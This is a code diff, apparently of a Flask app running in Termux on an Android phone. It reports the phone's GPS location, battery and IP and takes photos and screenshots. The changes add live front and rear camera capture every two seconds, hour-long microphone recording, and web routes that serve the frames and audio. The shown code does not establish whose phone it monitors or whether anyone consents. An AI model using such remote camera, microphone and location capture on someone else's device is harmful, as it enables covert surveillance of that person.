@@ -1,4 +1,4 @@
-from flask import Flask, render_template_string, jsonify, request, send_file
+from flask import Flask, render_template_string, jsonify, request, send_file, Response
 import os, json, threading, time, subprocess, requests as req
 from datetime import datetime
 
@@ -19,9 +19,10 @@ FOTOS_DIR = "/data/data/com.termux/files/home/eyelive_fotos"
 os.makedirs(FOTOS_DIR, exist_ok=True)
 
 dados = {"nome":DEVICE_NAME,"bateria":"?%","carregando":False,"gps":{"lat":0,"lng":0},"ip":"","fotos":[],"ultimo_update":"","status":"online"}
+live_ativo = {"frontal": False, "traseira": False}
 
 def shell(cmd):
-    try: return subprocess.check_output(cmd,shell=True,text=True,timeout=10).strip()
+    try: return subprocess.check_output(cmd,shell=True,text=True,timeout=5).strip()
     except: return "?"
 
 def salvar():
@@ -48,9 +49,14 @@ def coletar():
             dados["ip"]=shell("curl -4 -s ifconfig.me 2>/dev/null") or "?"
             dados["ultimo_update"]=datetime.now().strftime("%H:%M:%S")
             dados["fotos"]=sorted([f for f in os.listdir(FOTOS_DIR) if f.endswith('.jpg')])[-10:]
+            # Live: atualizar frame a cada 2s
+            if live_ativo["frontal"]:
+                shell("termux-camera-photo -c 0 /tmp/eyelive_frontal.jpg 2>/dev/null")
+            if live_ativo["traseira"]:
+                shell("termux-camera-photo -c 1 /tmp/eyelive_traseira.jpg 2>/dev/null")
             salvar()
         except: pass
-        time.sleep(30)
+        time.sleep(2)
 
 threading.Thread(target=coletar,daemon=True).start()
 
@@ -73,26 +79,48 @@ def cmd(c):
     if c=='foto_frontal':
         n=f"frontal_{datetime.now().strftime('%H%M%S')}.jpg"
         threading.Thread(target=lambda:shell(f"termux-camera-photo -c 0 {FOTOS_DIR}/{n} 2>/dev/null"),daemon=True).start()
-        return jsonify({"msg":"Foto frontal OK!"})
+        return jsonify({"msg":"Foto frontal salva!"})
     elif c=='foto_traseira':
         n=f"traseira_{datetime.now().strftime('%H%M%S')}.jpg"
         threading.Thread(target=lambda:shell(f"termux-camera-photo -c 1 {FOTOS_DIR}/{n} 2>/dev/null"),daemon=True).start()
-        return jsonify({"msg":"Foto traseira OK!"})
+        return jsonify({"msg":"Foto traseira salva!"})
+    elif c=='live_frontal':
+        live_ativo["frontal"]=True
+        return jsonify({"msg":"Live frontal iniciada!"})
+    elif c=='live_traseira':
+        live_ativo["traseira"]=True
+        return jsonify({"msg":"Live traseira iniciada!"})
+    elif c=='parar_frontal':
+        live_ativo["frontal"]=False
+        return jsonify({"msg":"Live frontal parada"})
+    elif c=='parar_traseira':
+        live_ativo["traseira"]=False
+        return jsonify({"msg":"Live traseira parada"})
     elif c=='audio':
         threading.Thread(target=lambda:shell("termux-microphone-record -f /tmp/eyelive_audio.aac -l 30 -q 2>/dev/null"),daemon=True).start()
         return jsonify({"msg":"Gravando 30s..."})
+    elif c=='audio_live':
+        # Criar arquivo de áudio para streaming
+        shell("termux-microphone-record -f /tmp/eyelive_audio_live.aac -l 3600 -q 2>/dev/null &")
+        return jsonify({"msg":"Streaming de audio iniciado!"})
     elif c=='screenshot':
         threading.Thread(target=lambda:shell("screencap /tmp/eyelive_screenshot.png 2>/dev/null"),daemon=True).start()
-        return jsonify({"msg":"Screenshot OK!"})
+        return jsonify({"msg":"Screenshot salvo!"})
     return jsonify({"msg":"OK"})
 
 @app.route('/live/<cam>')
 def live(cam):
-    c="0" if cam=="frontal" else "1"
-    p=f"/tmp/eyelive_live_{cam}.jpg"
-    shell(f"termux-camera-photo -c {c} {p} 2>/dev/null")
-    if os.path.exists(p): return send_file(p,mimetype='image/jpeg')
-    return "",404
+    path = f"/tmp/eyelive_{cam}.jpg"
+    if os.path.exists(path):
+        return send_file(path, mimetype='image/jpeg')
+    return "", 404
+
+@app.route('/audio_live')
+def audio_live():
+    path = "/tmp/eyelive_audio_live.aac"
+    if os.path.exists(path):
+        return send_file(path, mimetype='audio/aac')
+    return "", 404
 
 @app.route('/foto/<nome>')
 def foto(nome):
